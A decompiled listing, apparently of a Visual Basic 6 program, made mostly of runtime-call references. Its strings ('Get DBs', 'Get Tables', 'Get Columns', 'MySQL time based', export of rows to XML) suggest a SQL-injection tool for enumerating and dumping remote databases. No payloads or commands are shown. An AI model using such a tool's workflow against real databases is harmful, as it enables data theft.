'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaStrVarVal
'N  * ref: "%ROWS%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaPut3
'N  * ref: __vbaFileClose
'N  * ref: __vbaI2I4
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
Sub tlbMain_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrVarVal
'N  * ref: Val(
'N  * ref: __vbaObjSet
'N  * ref: __vbaFpI2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrVarVal
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: "Start"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "/"
'N  * ref: InstrRev(
'N  * ref: Left(
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObj
End Sub
 
Sub tlbRead_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: "Read"
'N  * ref: __vbaStrCmp
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Getting Column data"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Reading file: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: Subr_178
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
End Sub
 
Sub tlbTables_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaOnError
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: "Stop"
'N  * ref: __vbaStrCmp
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Get DBs"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Finding Data Bases"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: Subr_174
'N  * ref: __vbaFreeVar
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Get Tables"
'N  * ref: __vbaStrCmp
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Finding Tables"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjIs
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Left(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: Subr_217
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: IsArray(
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCat
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: IIf(
'N  * ref: __vbaStrMove
'N  * ref: Subr_173
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Get Columns"
'N  * ref: __vbaStrCmp
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Finding Columns"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaAryVar
'N  * ref: __vbaAryCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Left(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_219
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: IsArray(
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCat
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: IIf(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_175
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: "Select one or more tables"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Get Data"
'N  * ref: __vbaStrCmp
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: "Please select some columns"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Getting Column data"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "Saving data into file: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Mid(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "*"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_177
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaI4ErrVar
'N  * ref: LCase(
'N  * ref: "mssql*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Can not get rows count, trying to get 10 rows"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: FreeFile
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: "<?xml version=" & """" & "1.0" & """" & "?>"
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "<table name=" & """"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: """" & ">"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: vbTab
'N  * ref: "<row>"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: vbTab
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "<%Head%>%Data%</%Head%>"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: vbTab
'N  * ref: "</row>"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: "</table>"
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: "%Data%"
'N  * ref: __vbaStrCopy
'N  * ref: vbTab
'N  * ref: __vbaStrCopy
'N  * ref: vbLf
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFileOpen
'N  * ref: __vbaPut3
'N  * ref: __vbaI4Var
'N  * ref: __vbaPut3
'N  * ref: __vbaOnError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaRedimPreserve
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Mid(
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_176
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "^"
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaAryVar
'N  * ref: __vbaAryCopy
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaI4Var
'N  * ref: __vbaAryLock
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Subr_188
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
